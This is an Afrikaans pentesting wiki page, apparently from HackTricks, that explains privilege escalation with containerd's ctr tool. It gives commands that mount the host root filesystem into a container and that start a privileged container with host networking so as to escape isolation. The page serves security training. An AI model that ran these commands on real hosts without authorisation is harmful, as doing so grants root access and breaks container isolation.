# Containerd (ctr) Voorreg-eskalering

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

Gaan na die volgende skakel om te leer **waar `containerd` en `ctr` in die container-stapel pas**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

As jy vind dat ’n host die `ctr`-opdrag bevat, die native CLI wat saam met containerd gebundel is:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Jy kan die images wat aan containerd bekend is, lys:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Voer dan **een van daardie images uit met die host se root rekursief aan die container se root gebind-gemonteer**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Begin ’n container in privileged mode en toets vir ’n escape.\
Jy kan ’n privileged container met host networking uitvoer soos:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` verleen aan die proses die oproeper se effektiewe Linux-vermoëns en verwyder verskeie isolasiekontroles, maar 'n ontsnapping bly omgewingsafhanklik; gebruik die tegnieke wat op die volgende bladsy genoem word om daarvoor te toets:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Aan die gang met containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementering van die `ctr image`-opdrag](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementering van die `ctr run`-opdrag](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux-kern se dokumentasie oor gedeelde subbome](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI-pakket: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd se `ctr`-opdragvlae](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
